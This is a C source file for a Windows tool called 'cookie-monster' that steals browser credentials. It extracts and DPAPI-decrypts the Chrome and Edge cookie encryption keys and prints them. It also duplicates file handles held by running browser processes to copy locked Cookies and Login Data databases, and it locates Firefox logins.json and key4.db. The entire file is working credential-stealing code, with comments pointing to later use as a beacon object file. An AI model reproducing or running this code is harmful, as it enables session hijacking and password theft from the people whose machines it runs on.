// Code based on mr.un1k0d3r's seasonal videos

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "cookie-monster.h"

CHAR *GetCookieFileContent(CHAR *path);
CHAR *ExtractKey(CHAR *buffer);
VOID GetMasterKey(CHAR *key);
VOID GetChromeKey();
VOID GetFirefoxInfo();
VOID GetEdgeKey();
CHAR *GetFirefoxFile(CHAR *file, CHAR* profile);
BOOL GetChromeDatabase(DWORD PID);
VOID GetChromePID();
BOOL GetEdgeDatabase(DWORD PID);
VOID GetEdgePID();
BOOL GetChromePasswords(DWORD PID);
BOOL GetEdgePasswords(DWORD PID);


CHAR *GetCookieFileContent(CHAR *path) {
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;

    //get appdata local path and append path 
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, path);

    printf("LOOKING FOR FILE: %s \n", appdata);
    
    //get handle to appdata
    hFile = CreateFile(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read cookie file and return as buffer var
    dwSize = GetFileSize(hFile, NULL);
    buffer = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    ReadFile(hFile, buffer, dwSize, &dwRead, NULL);

    if(dwSize != dwRead) {
        printf("file size mismatch.\n");
    }
    CloseHandle(hFile);
    return buffer;
}

CHAR *ExtractKey(CHAR *buffer) {
    //look for pattern with key
    CHAR pattern[] = "encrypted_key\":\"";
    CHAR *start = strstr(buffer, pattern);

    CHAR *end = NULL;
    CHAR *key = NULL;
    DWORD dwSize = 0;
    
    if(start == NULL) {
        return NULL;
    }
    printf("Encrpyted string start at 0x%p buffer start at 0x%p \n", start, buffer);
    
    // calc length of key
    start += strlen(pattern);
    buffer = start;
    end = strstr(buffer, "\"");

    if(end == NULL) {
        return NULL;
    }
    dwSize = end - start;
    printf("Encrpyted data size is %d\n", dwSize);

    //extract key from file
    key = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    strncpy(key, buffer, dwSize);
    return key;
}

VOID GetMasterKey(CHAR *key) {
    BYTE *byteKey = NULL;
    DWORD dwOut = 0;
    //calculate size of key
    CryptStringToBinary(key, strlen(key), CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL);
    printf("base64 size needed is %d.\n", dwOut);

    //base64 decode key
    byteKey = (CHAR*)GlobalAlloc(GPTR, dwOut);
    CryptStringToBinary(key, strlen(key), CRYPT_STRING_BASE64, byteKey, &dwOut, NULL, NULL);  
    byteKey += 5;
    
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = byteKey;
    db.cbData = dwOut;

    //decrypt key with dpapi for current user
    BOOL result = CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
    if(!result) {
        printf("Decrypting the key failed.\n");
        return;
    }

    // return decrypted key
    CHAR *output = (CHAR*)GlobalAlloc(GPTR, (final.cbData * 4) + 1);
    DWORD i = 0;
    for(i = 0; i < final.cbData; i++) {
        sprintf(output, "%s\\x%02x", output, final.pbData[i]);
    }

    printf("Decrypted Key: %s \n", output );

    // rewind to the start of the buffer
    GlobalFree(byteKey - 5);
    GlobalFree(output);
}

VOID GetChromeKey() {
    //get chrome key
    CHAR *data = GetCookieFileContent("\\Google\\Chrome\\User Data\\Local State");
    CHAR *key = NULL;

    if(data == NULL) {
        printf("Reading the file failed.\n");
        return;
    }

    key = ExtractKey(data);
    GlobalFree(data);
    if(key == NULL) {
        printf("getting the key failed.\n");
        return;
    }

    GetMasterKey(key);
    return;
}

VOID GetEdgeKey() {
    //get edge key
    CHAR *data = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Local State");
    CHAR *key = NULL;
    if(data == NULL) {
        printf("Reading the file failed.\n");
        return;
    }

    key = ExtractKey(data);
    GlobalFree(data);
    if(key == NULL) {
        printf("getting the key failed.\n");
        return;
    }

    GetMasterKey(key);

}

CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
    CHAR *appdata = NULL;
    CHAR *tempProfile = NULL;
    // create temp var to hold profile
    tempProfile = (CHAR*)GlobalAlloc(GPTR, strlen(profile) + 1);
    strncpy(tempProfile, profile, strlen(profile)+1);

    appdata = (CHAR*)GlobalAlloc(GPTR, MAX_PATH + 1);

    //get appdata local path and append path to file
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    file = strncat(tempProfile, file, strlen(file)+1);
    PathAppend(appdata, "\\Mozilla\\Firefox\\Profiles");
    PathAppend(appdata, file);

    return appdata;
}

VOID GetFirefoxInfo() {
    //get firefox key
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;

    //get appdata local path and append path 
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, "\\Mozilla\\Firefox\\profiles.ini");
    
    //get handle to appdata
    hFile = CreateFile(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", appdata);
        printf("Firefox not found on host\n");
        return;
    }
    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read profiles.ini file and return as buffer var
    dwSize = GetFileSize(hFile, NULL);
    buffer = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    ReadFile(hFile, buffer, dwSize, &dwRead, NULL);

    if(dwSize != dwRead) {
        printf("file size mismatch.\n");
    }
    CloseHandle(hFile);

    //look for pattern Default=Profiles/
    CHAR pattern[] = "Default=Profiles/";
    CHAR *start = strstr(buffer, pattern);
    CHAR *end = NULL;

    if(start == NULL) {
        return;
    }

    // calc length of profile
    start += strlen(pattern);
    buffer = start;
    end = strstr(buffer, ".default-release");

    if(end == NULL) {
        return ;
    }
    dwSize = end - start;

    //printf("Profile size is %d\n", dwSize);

    //extract profile from file
    CHAR *profile = NULL;
    profile = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    strncpy(profile, buffer, dwSize);

    printf("Profile: %s \n", profile );

    // get path to logins.json
    CHAR *logins = NULL;
    logins = GetFirefoxFile(".default-release\\logins.json", profile);
    printf("Logins: %s \n", logins );

    //check if logins.json exists
    hFile = CreateFile(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", logins);
        return;
    }
    else{
        printf("Firefox Stored Credentials found at: %s \n", logins);
        //TODO in BOF DOWNLOAD FILE
    }

    // get path to logins.json
    CHAR *database = NULL;
    database = GetFirefoxFile(".default-release\\key4.db", profile);

    //check if key4.db exists
    hFile = CreateFile(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", database);
        return;
    }
    else{
        printf("Firefox Database found at: %s \n", database);
        //TODO in BOF DOWNLOAD FILE
        return;
    }

}

VOID GetChromePID() {
    //get handle to all processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    //iterate through each handle to find chrome.exe
    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, "chrome.exe") == 0) 
            {
                //chrome was found, get cookies database
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetChromeDatabase(pe32.th32ProcessID)){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetChromePasswords(pe32.th32ProcessID)){
                        passwordStatus = TRUE;
                    }
                }
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        printf("chrome.exe not found on host\n");
        CHAR *data = GetCookieFileContent("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
        if(data == NULL) {
            printf("Chrome COOKIES not found on host\n");
            return;
        }
        //save data to file
        HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD dwRead = 0;
        WriteFile(hFile, data, strlen(data), &dwRead, NULL);
        CloseHandle(hFile);
        GlobalFree(data);
        // print current directory to screen
        CHAR cwd[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, cwd);
        printf("Chrome COOKIES saved to %s \n", cwd);

        CHAR *passwordData = GetCookieFileContent("\\Google\\Chrome\\User Data\\Login Data");
        if(passwordData == NULL) {
            printf("Chrome LOGIN DATA not found on host\n");
            return;
        }
        //save data to file
        HANDLE hFile2 = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD dwRead2 = 0;
        WriteFile(hFile2, passwordData, strlen(passwordData), &dwRead2, NULL);
        CloseHandle(hFile2);
        GlobalFree(passwordData);
        // print current directory to screen
        GetCurrentDirectory(MAX_PATH, cwd);
        printf("Chrome LOGIN DATA saved to %s \n", cwd);
    }
}

BOOL GetChromeDatabase(DWORD PID) {
    
    printf("chrome PID found %d\n", PID);
    
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);

    printf("Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        //check if handle to file
        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
            //check if handle is to our PID
            if(shi->Handles[i].ProcessId == PID) {
                
                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                        if(hProc == INVALID_HANDLE_VALUE) {
                            printf("OpenProcess failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;
                        }

                        HANDLE hDuplicate = NULL;
                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                            printf("DuplicateHandle failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;                   
                        }

                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
                        CHAR filename[256];
                        ZeroMemory(filename, 256);
                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
                        printf("%s\n", filename);

                        if(firstHandle) {
                            DWORD dwFilenameSize = strlen(filename);
                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
                            firstHandle = FALSE;

                            if(strcmp(newFilename, "Application") == 0) {
                                printf("SKIPPING PID %d\n", PID);
                                GlobalFree(shi);
                                return FALSE;
                            }
                        }

                        if(strstr(filename, "Cookies") != NULL) {
                            printf("COOKIE WAS FOUND\n");
                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                            printf("file size is %d\n", dwFileSize);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                            CloseHandle(hFile);

                            GlobalFree(buffer);
                            return TRUE;
                        }

                        CloseHandle(hDuplicate);
                }
            }
        }
    }
    printf("NO HANDLE TO COOKIE WAS FOUND \n");
    return FALSE;
}

BOOL GetChromePasswords(DWORD PID) {
    
    printf("chrome PID found %d\n", PID);
    
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);

    printf("Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        //check if handle to file
        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
            //check if handle is to our PID
            if(shi->Handles[i].ProcessId == PID) {
                
                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                        if(hProc == INVALID_HANDLE_VALUE) {
                            printf("OpenProcess failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;
                        }

                        HANDLE hDuplicate = NULL;
                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                            printf("DuplicateHandle failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;                   
                        }

                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
                        CHAR filename[256];
                        ZeroMemory(filename, 256);
                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
                        printf("%s\n", filename);

                        if(firstHandle) {
                            DWORD dwFilenameSize = strlen(filename);
                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
                            firstHandle = FALSE;

                            if(strcmp(newFilename, "Application") == 0) {
                                printf("SKIPPING PID %d\n", PID);
                                GlobalFree(shi);
                                return FALSE;
                            }
                        }

                        if(strstr(filename, "Login Data") != NULL) {
                            printf("Login Data WAS FOUND\n");
                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                            printf("file size is %d\n", dwFileSize);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            HANDLE hFile = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                            CloseHandle(hFile);

                            GlobalFree(buffer);
                            return TRUE;
                        }

                        CloseHandle(hDuplicate);
                }
            }
        }
    }
    printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
    return FALSE;
}


VOID GetEdgePID() {
    //get handle to all processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    //iterate through each handle to find chrome.exe
    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, "msedge.exe") == 0) 
            {
                //edge was found, get cookies database
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetEdgeDatabase(pe32.th32ProcessID)){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetEdgePasswords(pe32.th32ProcessID)){
                        passwordStatus = TRUE;
                    }
                }
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        printf("msedge.exe not found on host\n");
        CHAR *data = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies");
        if(data == NULL) {
            printf("Edge COOKIES not found on host\n");
            return;
        }
        //save data to file
        HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD dwRead = 0;
        WriteFile(hFile, data, strlen(data), &dwRead, NULL);
        CloseHandle(hFile);
        GlobalFree(data);
        // print current directory to screen
        CHAR cwd[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, cwd);
        printf("Edge COOKIES saved to %s \n", cwd);

        
        CHAR *passwordData = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Default\\Login Data");
        if(passwordData == NULL) {
            printf("Edge LOGIN DATA not found on host\n");
            return;
        }
        //save data to file
        HANDLE hFile2 = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD dwRead2 = 0;
        WriteFile(hFile2, passwordData, strlen(passwordData), &dwRead2, NULL);
        CloseHandle(hFile2);
        GlobalFree(passwordData);
        // print current directory to screen
        GetCurrentDirectory(MAX_PATH, cwd);
        printf("Edge LOGIN DATA saved to %s \n", cwd);
    }
}

BOOL GetEdgeDatabase(DWORD PID) {
    
    printf("Edge PID found %d\n", PID);
    
    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
    DWORD dwNeeded = 0;
    NTSTATUS status;
    DWORD dwSize = 0xffffff / 2;
    //shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
    //utilize NtQueryStemInformation to list all handles on system
    PSYSTEM_HANDLE_INFORMATION shi;
    ULONG handleInfoSize = 0x10000;
    shi = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        shi,
        handleInfoSize,
        NULL
        )) == STATUS_INFO_LENGTH_MISMATCH)
        shi = (PSYSTEM_HANDLE_INFORMATION)realloc(shi, handleInfoSize *= 2);

    //NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);

    printf("Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        //check if handle to file
        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
            //check if handle is to our PID
            if(shi->Handles[i].ProcessId == PID) {

                /*
                ULONG ProcessId;
                UCHAR ObjectTypeNumber;
                UCHAR Flags;
                USHORT Handle;
                PVOID Object;
                ACCESS_MASK GrantedAccess;
                */
                
                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
                
                
                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                        if(hProc == INVALID_HANDLE_VALUE) {
                            printf("OpenProcess failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;
                        }
                        //get last error
                        //DWORD dwError = NULL;
                        //dwError = GetLastError();
                        //printf("Last Error: %d\n", dwError);

                        HANDLE hDuplicate = NULL;
                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                            printf("DuplicateHandle failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;                   
                        }
                        //get last error
                        DWORD dwError2 = NULL;
                        dwError2 = GetLastError();
                        printf("Last Error: %d\n", dwError2);
                        //when file does not exist on disk, error 87 thrown
                        if(dwError2 == 87) {
                            SetLastError(0);
                            printf("Wrong Function Call Somewhere \n");
                            //GlobalFree(shi);
                            continue;
                        }

                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
                        CHAR filename[256];
                        ZeroMemory(filename, 256);
                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
                        
                        printf("%s\n", filename);
                        printf("Length of file name is %d\n", strlen(filename));
                        
                        if(firstHandle) {
                            DWORD dwFilenameSize = strlen(filename);
                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
                            firstHandle = FALSE;

                            if(strcmp(newFilename, "Application") == 0) {
                                printf("SKIPPING PID %d\n", PID);
                                GlobalFree(shi);
                                return FALSE;
                            }
                        }

                        if(strstr(filename, "Cookies") != NULL) {
                            printf("COOKIE WAS FOUND\n");
                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                            printf("file size is %d\n", dwFileSize);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                            CloseHandle(hFile);

                            GlobalFree(buffer);
                            return TRUE;
                        }

                        CloseHandle(hDuplicate);
                }
            }
        }
    }
    printf("NO HANDLE TO COOKIE WAS FOUND \n");
    return FALSE;
}

BOOL GetEdgePasswords(DWORD PID) {
    
    printf("Edge PID found %d\n", PID);
    
    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
    DWORD dwNeeded = 0;
    NTSTATUS status;
    DWORD dwSize = 0xffffff / 2;
    //shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
    //utilize NtQueryStemInformation to list all handles on system
    PSYSTEM_HANDLE_INFORMATION shi;
    ULONG handleInfoSize = 0x10000;
    shi = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        shi,
        handleInfoSize,
        NULL
        )) == STATUS_INFO_LENGTH_MISMATCH)
        shi = (PSYSTEM_HANDLE_INFORMATION)realloc(shi, handleInfoSize *= 2);

    //NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);

    printf("Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        //check if handle to file
        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
            //check if handle is to our PID
            if(shi->Handles[i].ProcessId == PID) {
                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
                
                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                        if(hProc == INVALID_HANDLE_VALUE) {
                            printf("OpenProcess failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;
                        }

                        HANDLE hDuplicate = NULL;
                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                            printf("DuplicateHandle failed %d\n", GetLastError());
                            GlobalFree(shi);
                            return FALSE;                   
                        }
                        //when file does not exist on disk, error 87 thrown
                        DWORD dwError2 = NULL;
                        dwError2 = GetLastError();
                        printf("Last Error: %d\n", dwError2);
                        if(dwError2 == 87) {
                            SetLastError(0);
                            printf("Wrong Function Call Somewhere \n");
                            //GlobalFree(shi);
                            continue;
                        }

                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
                        CHAR filename[256];
                        ZeroMemory(filename, 256);
                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
                        

                        printf("%s\n", filename);
                        printf("Length of file name is %d\n", strlen(filename));
                        
                        if(firstHandle) {
                            DWORD dwFilenameSize = strlen(filename);
                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
                            firstHandle = FALSE;

                            if(strcmp(newFilename, "Application") == 0) {
                                printf("SKIPPING PID %d\n", PID);
                                GlobalFree(shi);
                                return FALSE;
                            }
                        }

                        if(strstr(filename, "Login Data") != NULL) {
                            printf("LOGIN DATA WAS FOUND\n");
                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                            printf("file size is %d\n", dwFileSize);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            HANDLE hFile = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                            CloseHandle(hFile);

                            GlobalFree(buffer);
                            return TRUE;
                        }

                        CloseHandle(hDuplicate);
                }
            }
        }
    }
    printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
    return FALSE;
}


int main(int argc, char* argv[]) {
    //parse command line arguements
    if(strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0 || (argc < 1)) {
        printf("Usage: %s [--all, --edge --chrome, --firefox] \n", argv[0]);
        printf("Cookie Monster Example:\n");
        printf("  cookie-monster.exe --all \n");
        printf("Cookie Monster Options:\n");
        printf("  -h, --help\t\t\t Show this help message and exit\n");
        printf("  --all\t\t\t\t Extract chrome, edge, and firefox keys\n");
        printf("  --edge\t\t\t Extract edge keys\n");
        printf("  --chrome\t\t\t Extract chrome keys\n");
        printf("  --firefox\t\t\t Extract firefox keys\n");
        return 0;
    }
    if(strcmp(argv[1], "--all") == 0){
        
        GetChromeKey();
        GetEdgeKey();
        GetFirefoxInfo();
        GetChromePID();
        GetEdgePID();
        return 0;
    }
    if(strcmp(argv[1], "--chrome") == 0){
        GetChromeKey();
        GetChromePID();
        return 0;
    }
    if(strcmp(argv[1], "--edge") == 0){
        GetEdgeKey();
        GetEdgePID();
        //GetEdgeDatabase(7276);
        return 0;
    }
    if(strcmp(argv[1], "--firefox") == 0){
        //TODO: GET FIREFOX KEY
        GetFirefoxInfo();
        return 0;
    }
    
    
}